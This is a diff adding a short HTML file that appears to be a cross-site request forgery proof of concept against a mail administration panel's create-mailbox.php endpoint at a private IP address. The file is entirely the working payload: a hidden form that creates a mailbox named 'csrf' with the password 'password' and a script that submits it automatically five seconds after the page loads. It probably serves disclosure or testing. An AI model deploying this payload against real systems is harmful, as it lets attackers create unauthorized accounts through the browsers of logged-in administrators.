@@ -1,0 +1,15 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+<form action="http://192.168.1.102/create-mailbox.php?domain=testingnomxsecurity.com" method="POST" id="mailbox" name="mailbox">
+<input type="hidden" value="csrf" name="fUsername" id="fUsername"/>
+<input type="hidden" value="testingnomxsecurity.com" name="fDomain" id="fDomain"/>
+<input type="hidden" value="password" name="fPassword" id="fPassword"/>
+<input type="hidden" value="password" name="fPassword2" id="fPassword2"/>
+<input type="hidden" value="csrf" name="fName" id="fName"/>
+<input type="hidden" value="on" name="fActive" id="fActive"/>
+<input type="hidden" value="on" name="fMail" id="fMail"/>
+</form>
+<script>
+$(document).ready(function(e) {
+	setTimeout(function() {$('#mailbox').submit();},5000);
+});
+</script>
